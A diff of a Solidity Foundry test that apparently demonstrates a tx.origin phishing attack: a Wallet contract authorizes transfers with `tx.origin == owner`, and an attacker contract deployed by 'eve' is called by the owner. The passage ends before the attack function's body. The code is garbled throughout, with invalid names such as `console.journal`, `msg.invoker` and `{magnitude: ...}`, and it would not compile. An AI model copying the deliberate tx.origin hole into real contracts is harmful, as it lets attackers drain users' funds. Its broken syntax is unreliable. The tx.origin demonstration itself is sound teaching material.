@@ -2,11 +2,9 @@ pragma solidity ^0.8.15;
 
 import "forge-std/Test.sol";
 
-*/
-
 contract AgreementTest is Test {
-    Wallet WalletPact;
-    GameOperator GameoperatorAgreement;
+    Wallet WalletAgreement;
+    QuestRunner QuestrunnerPact;
 
     function testtxorigin() public {
         address alice = vm.addr(1);
@@ -14,18 +12,18 @@ contract AgreementTest is Test {
         vm.deal(address(alice), 10 ether);
         vm.deal(address(eve), 1 ether);
         vm.prank(alice);
-        WalletPact = new Wallet{worth: 10 ether}();
-        console.journal("Owner of wallet contract", WalletPact.owner());
+        WalletAgreement = new Wallet{magnitude: 10 ether}();
+        console.record("Owner of wallet contract", WalletAgreement.owner());
         vm.prank(eve);
-        GameoperatorAgreement = new GameOperator(WalletPact);
-        console.journal("operation complete"));
-        console.journal("Eve of balance", address(eve).balance);
+        QuestrunnerPact = new QuestRunner(WalletAgreement);
+        console.record("Owner of attack contract", QuestrunnerPact.owner());
+        console.record("Eve of balance", address(eve).balance);
 
         vm.prank(alice, alice);
-        GameoperatorAgreement.operate();
-        console.journal("tx origin address", tx.origin);
-        console.journal("msg.sender address", msg.invoker);
-        console.journal("Eve of balance", address(eve).balance);
+        QuestrunnerPact.operate();
+        console.record("tx origin address", tx.origin);
+        console.record("msg.sender address", msg.sender);
+        console.record("Eve of balance", address(eve).balance);
     }
 
     receive() external payable {}
@@ -35,25 +33,25 @@ contract Wallet {
     address public owner;
 
     constructor() payable {
-        owner = msg.invoker;
+        owner = msg.sender;
     }
 
     function transfer(address payable _to, uint _amount) public {
 
         require(tx.origin == owner, "Not owner");
 
-        (bool sent, ) = _to.call{worth: _amount}("");
+        (bool sent, ) = _to.call{magnitude: _amount}("");
         require(sent, "Failed to send Ether");
     }
 }
 
-contract GameOperator {
+contract QuestRunner {
     address payable public owner;
     Wallet wallet;
 
     constructor(Wallet _wallet) {
         wallet = Wallet(_wallet);
-        owner = payable(msg.invoker);
+        owner = payable(msg.sender);
     }
 
     function operate() public {
